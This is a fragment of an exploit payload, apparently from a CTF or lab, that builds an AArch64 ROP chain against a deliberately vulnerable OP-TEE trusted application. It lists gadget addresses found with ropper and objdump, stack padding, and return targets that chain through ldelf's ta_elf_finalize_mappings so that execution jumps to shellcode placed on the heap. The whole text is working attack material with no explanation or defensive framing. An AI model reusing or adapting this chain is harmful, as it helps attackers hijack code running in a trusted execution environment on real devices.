// hint: our most useful gadget comes from 
/*
/root/optee2/optee_os/lib/libutils/isoc/newlib/strrchr.c:91
    }

  return (char *) last;
}
    235c:       aa1303e0        mov     x0, x19
    2360:       a94153f3        ldp     x19, x20, [sp, #16]
    2364:       a8c27bfd        ldp     x29, x30, [sp], #32
    2368:       d65f03c0        ret

*/


// Ordinary Buffer Contents: 16*sizeof(char*)= 16*8 = 128 bytes
        1,2, 3,4,  4,5, 6,7,   8,9, 10,11,  12,13, 14,15, 
        
        // ================================
        // objdump
        /*
            ldp     x29, x30, [sp, #16]
            ldp     x19, x20, [sp, #32]
            ldp     x21, x22, [sp, #48]
            ldp     x23, x24, [sp, #64]
            ldr     x25, [sp, #80]
            add     sp, sp, #0xe0
            ret
        */ 
     
        // v--- SP
        16,17, // 16 bytes varargs
        // v--- x29, x30 before
        0xffffffffffffff01, 0x00001de0 + load_base,
        // v--- remaining 0xE0 - (2*16) = 192 bytes = 24 pointers
        1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,
        // return!
        
        // ================================
        // ropper -f /root/optee2/out-br/build/optee_examples-1.0/vuln/ta/out/ca212bbe-02b2-422c-8720-ba8f5d50414b.elf --nocolor | grep ", x30"  | grep -F "mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret" --color=always
        // ropper: 0x00001de0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
        // objdump:
        /*
            88f4:       aa1303e0        mov     x0, x19
            88f8:       a94153f3        ldp     x19, x20, [sp, #16]
            88fc:       a8c27bfd        ldp     x29, x30, [sp], #32
            8900:       d65f03c0        ret
        */
        
        // v--- SP        
        // v--- x29, x30
        0xffffffffffffff02, 0x00001de0 + load_base, 
        // v--- heap address to x19 (later x0), dontcare x20
        heap_dest_addr, 0xffffffffffffff03, 
        
        // return!
        // ================================
        // ropper: 0x00001de0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
        // objdump:
        /*
            88f4:       aa1303e0        mov     x0, x19
            88f8:       a94153f3        ldp     x19, x20, [sp, #16]
            88fc:       a8c27bfd        ldp     x29, x30, [sp], #32
            8900:       d65f03c0        ret
        */
        
        // v--- SP        
        // v--- x29, x30
        0xffffffffffffff04 , 0x000000000000208c + 12 + 0x40006000, // other load base for ldelf!
        // v--- dontcare x19, dontcare x20
        0xffffffffffffff05, 0xffffffffffffff06, 
        
        // ================================
        /*
            000000000000208c <ta_elf_finalize_mappings>:
            <+0> ldrb    w1, [x0, #2]
            <+4> cbz     w1, 2150 <ta_elf_finalize_mappings+0x90>
            <+8> stp     x29, x30, [sp, #-48]!
            <+12> mov     x29, sp
            <+16> stp     x19, x20, [sp, #16]
            <+20> mov     x20, x0

        */
        // v--- SP
        // 48 bytes of stuff, including x30 at the head (why head? why not bottom?)
        // v--- x29, x30 to shellcode
        0xffffffffffffff0b, heap_dest_addr + sizeof(struct ta_elf) + sizeof(struct segment),
        0xffffffffffffff07,0xffffffffffffff08,0xffffffffffffff09,0xffffffffffffff0a, // 32 bytes
        
        
        
        
        